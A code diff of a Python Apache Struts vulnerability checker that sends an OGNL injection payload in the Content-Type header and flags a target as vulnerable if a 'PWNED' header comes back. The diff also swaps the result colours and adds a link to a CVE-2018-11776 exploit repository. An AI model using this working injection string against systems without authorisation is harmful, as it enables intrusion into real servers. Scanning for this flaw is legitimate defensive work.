@@ -1,9 +1,8 @@
-# -*- coding: utf-8 -*-
-from colorama import Fore
-import requests
+from linker import *
 
 
-def chkstruts(url,timeout=30):
+def chkstruts(endpoint,timeout=30):
+    url = helpers.urlify(endpoint)['URL_FILE']
     ognl_payload = ".multipart/form-data~${"
     ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
     ognl_payload += "}"
@@ -11,8 +10,8 @@ def chkstruts(url,timeout=30):
     try:
         response = requests.get(url,headers=headers,timeout=timeout,verify=False)
         if "PWNED" in response.headers:
-            return "%sVulnerable" % (Fore.RED)
+            return "%sVulnerable [https://github.com/mazen160/struts-pwn_CVE-2018-11776]" % (Fore.GREEN)
         else:
-            return "%sSafe" % (Fore.GREEN)
+            return "%sSafe" % (Fore.RED)
     except Exception as e:
         return "%sUnreachable" % (Fore.RED)
